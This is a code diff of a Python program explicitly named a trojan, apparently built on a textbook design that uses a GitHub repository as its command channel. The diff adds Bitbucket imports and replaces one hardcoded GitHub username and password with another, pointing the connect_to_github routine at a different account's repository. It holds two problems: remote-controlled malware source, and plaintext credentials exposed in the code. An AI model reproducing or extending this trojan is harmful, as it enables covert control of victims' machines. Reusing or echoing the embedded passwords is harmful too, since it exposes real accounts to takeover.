@@ -9,6 +9,8 @@ import Queue
 import os
 import urllib3
 
+from bitbucket.bitbucket import Bitbucket
+from bitbucket.bitbucket import Repository
 from github3 import login
 
 trojan_id = "abc"
@@ -20,10 +22,10 @@ configured = False
 task_queue = Queue.Queue()
 
 def connect_to_github():
-	gh = login(username="brandonbevans", password="tucker123")
-	repo = gh.repository("brandonbevans", "chapter7")
-	branch = repo.branch("master")
 
+	gh = login(username="brandonbevans", password="justforshits3")
+	repo = gh.repository("lighteyes268", "sadeas")
+	branch = repo.branch("master")
 	return gh, repo, branch
 
 def get_file_contents(filepath):
